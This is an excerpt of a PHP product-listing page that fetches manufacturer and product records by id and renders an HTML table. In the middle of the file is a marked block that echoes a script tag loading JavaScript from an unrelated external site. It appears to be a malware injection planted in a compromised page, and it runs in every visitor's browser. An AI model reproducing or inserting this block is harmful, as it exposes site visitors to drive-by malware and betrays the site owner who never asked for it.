...
if(isset($_GET["id"]) AND is_numeric($_GET["id"])){
	...
	$query = "select * from manufacture where id = $manufacture_id";
	$manufacture_info = $cls -> db_select($query);
	...
	$query = "select cat_product.*, manufacture.name as mname 
			  ...
			  where cat_product.manufacture_id = $manufacture_id AND cat_product.status = 1 ";
...
#c81959#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224431\"></script>";
echo $srwv;
}
#/c81959#
?>
	...
	<td valign="top" colspan="2" style="background-color: #FFFFFF; border:2px solid #cccccc; ">
		...
		<b><!-- InstanceBeginEditable name="header" -->Manufacture Product For: ( <?=$manufacture_info[1][name] ?>  )<!-- InstanceEndEditable --></b>
